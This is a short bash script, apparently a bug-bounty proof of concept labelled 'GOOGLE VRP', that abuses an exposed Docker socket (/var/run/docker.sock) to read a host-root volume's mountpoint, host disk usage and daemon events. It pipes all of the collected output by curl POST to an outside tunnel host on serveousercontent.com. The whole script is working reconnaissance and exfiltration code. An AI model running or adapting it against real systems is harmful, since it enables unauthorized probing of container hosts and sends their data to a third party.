#!/bin/bash
URL="eca81085c0e34fa1-103-95-173-85.serveousercontent.com"

{
  echo "=== [!] GOOGLE VRP: DIRECT VOLUME INSPECTION ==="
  
  # 1. Inspect the volume p0_root directly
  # This proves the host root is mapped to the 'Mountpoint'
  echo "--- [1] VOLUME MOUNTPOINT PROOF ---"
  curl -s --unix-socket /var/run/docker.sock http://localhost/volumes/p0_root
  
  # 2. Query the Docker Daemon for host disk usage
  # This leaks the host's actual disk size and filesystem type
  echo -e "\n--- [2] HOST DISK SYSTEM LEAK ---"
  curl -s --unix-socket /var/run/docker.sock http://localhost/system/df

  # 3. Leak Docker Logs (Often contains host-level paths and errors)
  echo -e "\n--- [3] DOCKER DAEMON LOG FRAGMENTS ---"
  curl -s --unix-socket /var/run/docker.sock "http://localhost/events?until=$(date +%s)" | head -n 10

  echo -e "\n=== [!] EVIDENCE COLLECTION COMPLETE ==="
} | curl -s -X POST --data-binary @- "https://$URL"
